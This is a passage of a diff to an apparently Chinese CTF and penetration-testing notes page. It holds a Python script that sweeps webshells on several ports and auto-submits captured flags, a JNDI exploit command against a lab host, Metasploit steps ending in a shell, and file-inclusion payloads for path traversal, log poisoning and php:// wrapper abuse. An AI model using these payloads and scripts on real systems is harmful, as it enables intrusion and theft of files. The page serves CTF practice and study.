class="hljs-keyword">def</span> <span class="hljs-title function_">submit_flag</span>(<span class="hljs-params">target, teamtoken, flag</span>):<br>    url = flag_server % (teamtoken, flag)<br>    pos = &#123;&#125;<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+]Submitting flag:%s:%s&quot;</span> % (target, url)<br>    response = requests.post(url, data=pos)<br>    content = response.text<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+]content:%s&quot;</span> % content<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> content:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+]Success!!&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-]Failed&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;webshelllist.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <br>    f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;firstround_flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">8802</span>,<span class="hljs-number">8803</span>,<span class="hljs-number">8804</span>]: <br>        url1=url+<span class="hljs-built_in">str</span>(i)+shell<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;------------------------------------&quot;</span><br>            res=requests.post(url1,payload,timeout=<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> res.status_code == requests.codes.ok:<br>                <span class="hljs-built_in">print</span> url1 + <span class="hljs-string">&quot; connect shell sucess,flag is &quot;</span>+res.text<br>                <span class="hljs-comment"># 记录shell和获取的flag</span><br>                <span class="hljs-built_in">print</span> &gt;&gt;f1,url1+<span class="hljs-string">&quot; connect shell sucess,flag is &quot;</span>+res.text<br>                <span class="hljs-built_in">print</span> &gt;&gt;f,url1+<span class="hljs-string">&quot;,&quot;</span>+passwd<br>                <span class="hljs-comment"># 正则捕获flag</span><br>                <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;hello world(\w+)&#x27;</span>, res.text):   <br>                    flag = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;hello world(\w+)&#x27;</span>, res.text).group(<span class="hljs-number">1</span>)<br>                    submit_flag(url1, teamtoken, flag)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-]Can not get flag&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shell 404&quot;</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span> url1 + <span class="hljs-string">&quot;connect shell failed&quot;</span><br>    		<br>    f.close()<br>    f1.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        flag()<br>        flag()<br>        flag()<br>        time.sleep(n)<br><br>timer(<span class="hljs-number">120</span>)<br></code></pre></td></tr></table></figure>
+<h2 id="CMS框架漏洞检测"><a href="#CMS框架漏洞检测" class="headerlink" title="CMS框架漏洞检测"></a>CMS框架漏洞检测</h2><p>FrameScan</p>
+<h2 id="RCE脚本"><a href="#RCE脚本" class="headerlink" title="RCE脚本"></a>RCE脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shiro_rce_tool<br></code></pre></td></tr></table></figure>
+<p>下面开始进行测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -cp jndi_tool.jar jndi.HRMIServer http://0767012b-79cb-4520-a471-a210c3d1c4c5.node5.buuoj.cn:81/ &quot;ls&quot; <br></code></pre></td></tr></table></figure>
+<h2 id="SSTI-脚本"><a href="#SSTI-脚本" class="headerlink" title="SSTI 脚本"></a>SSTI 脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SSTImap<br></code></pre></td></tr></table></figure>
+<p>以及</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SSTIpayload generator<br></code></pre></td></tr></table></figure>
+<h1 id="Metasploit-测试"><a href="#Metasploit-测试" class="headerlink" title="Metasploit 测试"></a>Metasploit 测试</h1><p>初始化数据库 root权限下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfdb init<br></code></pre></td></tr></table></figure>
+<p>设置开机自启</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">service postgresql start<br></code></pre></td></tr></table></figure>
+<p>启动</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsle<br></code></pre></td></tr></table></figure>
+<p>内网主机发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">db_nmap -PR 192.168.129.0/24<br></code></pre></td></tr></table></figure>
+<p>对目标IP进行探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">db_nmap -sS -T4 -A 192.168.129.141<br></code></pre></td></tr></table></figure>
+<p>检测是否有常见漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">db_nmap --script=vuln 192.168.<br></code></pre></td></tr></table></figure>
+<p>auxiliary模块的使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">search eternal<br></code></pre></td></tr></table></figure>
+<p>使用模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use<br></code></pre></td></tr></table></figure>
+<p>显示参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">options<br></code></pre></td></tr></table></figure>
+<p>设置参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set host 192.168<br></code></pre></td></tr></table></figure>
+<p>显示目标</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show targets <br></code></pre></td></tr></table></figure>
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run<br></code></pre></td></tr></table></figure>
+<p>获取shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell<br></code></pre></td></tr></table></figure>
+
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>常见的文件包含漏洞的形式为 <code>&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;]); ?&gt;</code></p>
+<p>考虑常用的几种包含方式为</p>
+<ul>
+<li>同目录包含 <code>file=.htaccess</code></li>
+<li>目录遍历 <code>?file=../../../../../../../../../var/lib/locate.db</code></li>
+<li>日志注入 <code>?file=../../../../../../../../../var/log/apache/error.log</code></li>
+<li>利用 <code>/proc/self/environ</code></li>
+</ul>
+<p>其中日志可以使用SSH日志或者Web日志等多种日志来源测试</p>
+<h2 id="触发Sink"><a href="#触发Sink" class="headerlink" title="触发Sink"></a>触发Sink</h2><ul>
+<li>PHP<ul>
+<li>include<ul>
+<li>在包含过程中出错会报错，不影响执行后续语句</li>
+</ul>
+</li>
+<li>include_once<ul>
+<li>仅包含一次</li>
+</ul>
+</li>
+<li>require<ul>
+<li>在包含过程中出错，就会直接退出，不执行后续语句</li>
+</ul>
+</li>
+<li>require_once</li>
+</ul>
+</li>
+</ul>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</p>
+<p>url编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过<br><br>特殊字符绕过<br></code></pre></td></tr></table></figure>
+<ul>
+<li>某些情况下，读文件支持使用Shell通配符，如 <code>?</code> <code>*</code> 等</li>
+<li>url中 使用 <code>?</code> <code>#</code> 可能会影响include包含的结果</li>
+<li>某些情况下，unicode编码不同但是字形相近的字符有同一个效果</li>
+</ul>
+<p>%00截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">几乎是最常用的方法，条件是 ``magic_quotes_gpc`` 关闭，而且php版本小于5.3.4。<br><br>长度截断<br></code></pre></td></tr></table></figure>
+
+<p>Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。</p>
+<p>msdn定义 <code>#define MAX_PATH 260</code>，其中第260个字符为字符串结尾的 <code>\0</code> ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。</p>
+<p>获取最长文件路径长度：getconf PATH_MAX &#x2F;root 得到4096<br>获取最长文件名：getconf NAME_MAX &#x2F;root 得到255</p>
+<p>那么在长度有限的时候，<code>././././</code> (n个) 的形式就可以通过这个把路径爆掉</p>
+<p>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</p>
+<p>伪协议绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">- 远程包含: 要求 ``allow_url_fopen=On`` 且 ``allow_url_include=On`` ， payload为 ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` 的形式<br>- PHP input: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为 ``?file=php://input`` 的形式<br>- Base64: 使用Base64伪协议读取文件，payload为 ``?file=php://filter/convert.base64-encode/resource=index.php`` 的形式<br>- data: 使用data伪协议读取文件，payload为 ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 的形式，要求 ``allow_url_include=On``<br><br>协议绕过<br></code></pre></td></tr></table></figure>
+<p><code>allow_url_fopen</code> 和 <code>allow_url_include</code> 主要是针对 <code>http</code> <code>ftp</code> 两种协议起作用，因此可以使用SMB、WebDav协议等方式来绕过限制。</p>
+<h1 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Fvuln<br></code></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Nessus<br></code></pre></td></tr></table></figure>
 
 
     
@@ -243,7 +411,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1713081530242"></script>
+    <script async src="/js/copy-codeblock.js?v=1714040516094"></script>
   
 
   
